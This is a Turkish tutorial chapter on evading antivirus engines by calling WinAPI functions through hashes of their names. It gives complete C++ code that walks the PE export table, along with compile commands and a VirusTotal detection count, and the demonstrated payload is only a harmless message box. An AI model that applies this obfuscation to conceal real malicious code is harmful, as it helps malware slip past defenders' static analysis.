\newpage
\subsection{58. AV motorlarını atlatma teknikleri - bölüm 5. Basit bir C++ örneği.}

﷽

![av](./images/45/2022-03-25_10-50.png){width="80%"}    

Bu bölüm, başka bir AV atlatma tekniği üzerine kendi araştırmamın bir sonucudur. Basit bir C++ kötü amaçlı yazılımında AV motorlarını nasıl atlatacağımıza dair bir örnek.    

### fonksiyon adlarını hashleme (hashing function names)

Bu, WinAPI çağrılarını gizlemek için basit ama etkili bir tekniktir. **Fonksiyonları hash adlarıyla çağırıyoruz** ve bu yöntem basit olmasının yanı sıra "vahşi doğada" sıkça kullanılır.     

Bir örneğe bakalım, o zaman bunun çok da zor olmadığını anlayacaksınız.    

### standart çağırma

örneğe bakalım:   

```cpp
#include <windows.h>
#include <stdio.h>

int main() {
  MessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
  return 0;
}
```

Derleyin:    

```bash
i686-w64-mingw32-g++ meow.cpp -o meow.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -Wint-to-pointer-cast \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```

![av](./images/45/2022-03-25_15-11.png){width="80%"}    

Ve çalıştırın:      

![av](./images/45/2022-03-25_15-13.png){width="80%"}    

Beklendiği gibi, sadece bir pop-up penceresi açılıyor.     

Daha sonra `strings` komutunu çalıştırın:     

```bash
strings -n 8 meow.exe | grep MessageBox
```

![av](./images/45/2022-03-25_15-43.png){width="80%"}    

Gördüğünüz gibi, temel statik analiz sırasında WinAPI fonksiyonları açıkça okunabilir ve:     

![av](./images/45/2022-03-25_15-47.png){width="80%"}    

Uygulamanın import tablosunda görünür durumdadır.    

### hashleme   

Şimdi, kötü amaçlı yazılım analistlerinden `MessageBoxA` WinAPI fonksiyonunu gizleyelim.    

Hashleyelim:    

```python
# simple stupid hashing example
def myHash(data):
    hash = 0x35
    for i in range(0, len(data)):
        hash += ord(data[i]) + (hash << 1)
    print (hash)
    return hash

myHash("MessageBoxA")
```

and run it:    

```bash
python3 myhash.py
```

![av](./images/45/2022-03-25_15-52.png){width="80%"}    

### pratik örnek

Ana fikir nedir? Ana fikir, WinAPI fonksiyonlarının adreslerini, export edilen WinAPI fonksiyonlarını enumerate ederek hash adları ile bulduğumuz bir kod oluşturmaktır.    

Öncelikle, Python koduna mantık olarak benzeyen bir hash fonksiyonu tanımlayalım:   

```cpp
DWORD calcMyHash(char* data) {
  DWORD hash = 0x35;
  for (int i = 0; i < strlen(data); i++) {
    hash += data[i] + (hash << 1);
  }
  return hash;
}
```

Daha sonra, hash karşılaştırarak Windows API fonksiyon adresini bulan bir fonksiyon tanımladım:    

```cpp
static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
  PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
  PIMAGE_NT_HEADERS img_nt_header = 
  (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
  PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
    (LPBYTE)h + img_nt_header->
    OptionalHeader.
    DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
    VirtualAddress);
  PDWORD fAddr = (PDWORD)((LPBYTE)h + 
  img_edt->AddressOfFunctions);
  PDWORD fNames = (PDWORD)((LPBYTE)h + 
  img_edt->AddressOfNames);
  PWORD  fOrd = (PWORD)((LPBYTE)h + 
  img_edt->AddressOfNameOrdinals);

  for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
    LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);

    if (calcMyHash(pFuncName) == myHash) {
      printf("successfully found! %s - %d\n", 
      pFuncName, myHash);
      return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
    }
  }
  return nullptr;
}
```

Mantık oldukça basit. Öncelikle PE başlıklarından ihtiyacımız olan export edilen fonksiyonlara gideriz. Döngü içerisinde, fonksiyonumuza geçirilen hash değerini, export tablosundaki fonksiyonların hash değerleriyle karşılaştırırız ve eşleşme bulduğumuzda döngüden çıkarız:     

```cpp
//...
for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
  LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);

  if (calcMyHash(pFuncName) == myHash) {
    printf("successfully found! %s - %d\n", 
    pFuncName, myHash);
    return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
  }
}
//...
```

Daha sonra fonksiyon prototipimizi tanımlarız:    

```cpp
typedef UINT(CALLBACK* fnMessageBoxA)(
  HWND   hWnd,
  LPCSTR lpText,
  LPCSTR lpCaption,
  UINT   uType
);
```

Ve `main()` fonksiyonumuzu yazarız:    

```cpp
int main() {
  HMODULE mod = LoadLibrary("user32.dll");
  LPVOID addr = getAPIAddr(mod, 17036696);
  printf("0x%p\n", addr);
  fnMessageBoxA myMessageBoxA = (fnMessageBoxA)addr;
  myMessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
  return 0;
}
```

![av](./images/45/2022-03-25_11-10.png){width="80%"}    

Kötü amaçlı yazılımın tam kaynak kodu:    

```cpp
/*
 * hack.cpp - hashing Win32API functions. C++ implementation
 * @cocomelonc
 * https://cocomelonc.github.io/tutorial/
 2022/03/22/simple-malware-av-evasion-5.html
*/
#include <windows.h>
#include <stdio.h>

typedef UINT(CALLBACK* fnMessageBoxA)(
  HWND   hWnd,
  LPCSTR lpText,
  LPCSTR lpCaption,
  UINT   uType
);

DWORD calcMyHash(char* data) {
  DWORD hash = 0x35;
  for (int i = 0; i < strlen(data); i++) {
    hash += data[i] + (hash << 1);
  }
  return hash;
}

static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
  PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
  PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)(
  (LPBYTE)h + img_dos_header->e_lfanew);
  PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
    (LPBYTE)h + img_nt_header->
    OptionalHeader.
    DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
    VirtualAddress);
  PDWORD fAddr = (PDWORD)((LPBYTE)h + 
  img_edt->AddressOfFunctions);
  PDWORD fNames = (PDWORD)((LPBYTE)h + 
  img_edt->AddressOfNames);
  PWORD  fOrd = (PWORD)((LPBYTE)h + 
  img_edt->AddressOfNameOrdinals);

  for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
    LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);

    if (calcMyHash(pFuncName) == myHash) {
      printf("successfully found! %s - %d\n", 
      pFuncName, myHash);
      return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
    }
  }
  return nullptr;
}

int main() {
  HMODULE mod = LoadLibrary("user32.dll");
  LPVOID addr = getAPIAddr(mod, 17036696);
  printf("0x%p\n", addr);
  fnMessageBoxA myMessageBoxA = (fnMessageBoxA)addr;
  myMessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
  return 0;
}

```

### demo

`hack.cpp` dosyamızı derleyelim:    

```bash
i686-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -Wint-to-pointer-cast \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![av](./images/45/2022-03-25_10-57.png){width="80%"}    

ve çalıştırın:    

```powershell
.\hack.exe
```

![av](./images/45/2022-03-25_10-56.png){width="80%"}    

![av](./images/45/2022-03-25_10-53.png){width="80%"}    

Gördüğünüz gibi, mantığımız çalıştı!!! Mükemmel :)     

`strings` komutu ile kontrol edelim:       

```bash
strings -n 8 hack.exe | grep MessageBox
```

![av](./images/45/2022-03-25_11-11.png){width="80%"}    

Ve Import Address Table'ı inceleyelim:     

![av](./images/45/2022-03-25_11-24.png){width="80%"}    

Eğer kötü amaçlı yazılımı derinlemesine incelersek, tabii ki hashleri, `user32.dll` gibi dizeleri ve diğer ipuçlarını bulacağız. Ancak bu sadece bir vaka çalışmasıdır.     

Hadi VirusTotal'a yükleyelim:    

![av](./images/45/2022-03-25_16-56.png){width="80%"}    

[https://www.virustotal.com/gui/file/d33210e3d7f9629d3465b2a0cec0c490d2254fa1b9a2fd047457bd9046bc0eee/detection](https://www.virustotal.com/gui/file/d33210e3d7f9629d3465b2a0cec0c490d2254fa1b9a2fd047457bd9046bc0eee/detection)    

**65 antivirüs motorundan 4 tanesi dosyamızı zararlı olarak tespit etti.**    

Dikkat edin, Windows Defender’ı atlatmayı başardık!   

Peki ya klasik DLL enjeksiyonundaki WinAPI fonksiyonları?   

Bu konuda kendi araştırmalarımı yapıp sonraki gönderide yazacağım.     

Gerçek kötü amaçlı yazılımlarda, hashler ek matematiksel fonksiyonlarla korunur ve ayrıca şifrelenir.     

> Örneğin [Carbanak](https://en.wikipedia.org/wiki/Carbanak), AV motorlarını atlatmak için birkaç teknik kullanır ve bunlardan biri de WinAPI çağrılarını hashleme yöntemidir.

Umarım bu gönderi, mavi takım üyelerine bu ilginç teknik hakkında farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine yeni bir silah ekler.     

[pe file format](https://cocomelonc.github.io/tutorial/2021/10/31/windows-shellcoding-3.html)    
[Carbanak](https://en.wikipedia.org/wiki/Carbanak)    
[github'taki kaynak kod](https://github.com/cocomelonc/2022-03-22-malware-av-evasion-5)    
